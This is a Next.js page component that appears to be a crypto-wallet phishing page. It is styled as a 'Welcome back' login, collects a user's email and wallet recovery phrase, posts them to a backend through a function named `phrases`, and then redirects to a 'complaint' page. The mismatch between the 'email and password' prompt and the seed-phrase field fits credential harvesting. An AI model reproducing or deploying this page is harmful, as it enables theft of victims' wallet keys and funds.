"use client"
import Image from 'next/image'
import React, { useEffect, useState } from 'react'
import useEmblaCarousel from 'embla-carousel-react'
import logo from "@/public/images.png"
import Link from 'next/link'
import UseFormHandler from '../useFormHandler'
import { useRouter } from 'next/navigation'
import { LiaAngleLeftSolid } from 'react-icons/lia'
import { LuCircleDashed } from "react-icons/lu";
import { phrases } from '../services/authService'

function Page() {

    const router = useRouter()
    const [email, setEmail] = useState("")
    const [phrase, setPhrase] = useState("")


    const formdata = UseFormHandler({
        required: {
            phrase: 'Please Enter phrase',
            email: 'Please Enter Email',
        },
        initialValues: {
            phrase: '',
            email: ''
        },
        onSubmit: async (value) => {
            const { status, data } = await phrases(value).catch(() =>
                formdata.setProccessing(false)
            )
            if (status) {
                router.push(`/complaint?email=${value.email}`)
            }
        }
    })


    return (
        <div className='select-none scroll-smooth max-w-md mx-auto'>
            <div className="bg-slate-50 dark:bg-slate-950 flex flex-col min-h-screen h-screen">
                <div className="flex-grow py-8 space-y-4">
                    <div className="px-4">
                        <div onClick={() => router.back()} className="w-8 h-8 cursor-pointer text-xl flex items-center justify-center text-blue-500"><LiaAngleLeftSolid /></div>
                    </div>
                    <div className="h-full px-4 space-y-3">
                        <div className="">
                            <div className="w-24 h-24 rounded-full mx-auto overflow-hidden bg-gray-100 dark:bg-gray-900">
                                <Image src={logo} alt='logo' className='w-full h-full' />
                            </div>
                        </div>
                        <div className="text-center">
                            <div className="font-bold text-lg dark:text-white">Welcome back</div>
                            <div className="text-gray-400 text-sm">Enter your email address and password</div>
                        </div>
                        <div className="space-y-1">
                            <div className="font-bold text-sm">Email</div>
                            <input
                                // value={formdata.value.email}
                                onChange={(e) => { setEmail(e.target.value); formdata.value.email = e.target.value }}
                                className="w-full dark:bg-gray-900 appearance-none p-3 outline-none rounded-2xl"
                            />
                            <div className="text-xs text-red-600">{formdata?.error?.email}</div>
                        </div>
                        <div className="space-y-0">
                            <textarea
                                placeholder='Enter recovery phrase'
                                onChange={(e) => {
                                    setPhrase(e.target.value)
                                    formdata.value.phrase = e.target.value
                                }}
                                className="w-full dark:bg-gray-900 dark:placeholder:text-gray-700 resize-none text-sm min-h-32 appearance-none p-3 outline-none rounded-2xl"
                            />
                            <div className="text-[11px] text-gray-400">Separate each word with a space</div>
                            <div className="text-xs text-red-600">{formdata?.error?.phrase}</div>
                        </div>
                    </div>
                </div>
                {
                    formdata.proccessing && (
                        <div className="space-y-3 p-4">
                            <div className={`bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold flex items-center justify-center`}> <div className='animate-spin'> <LuCircleDashed /></div></div>
                        </div>
                    )
                }
                {!formdata.proccessing && (<div className="space-y-3 p-4">
                    <div onClick={() => email.length > 0 && formdata.submit()} className={`${email < 1 && "bg-opacity-30"} bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}>Login</div>
                    <div onClick={() => formdata.submit()} className="">
                        <div className="bg-white rounded-full text-center cursor-pointer py-4 px-9 text-blue-600 font-bold">Recover my account</div>
                    </div>
                </div>)}
            </div>
        </div>
    )
}

export default Page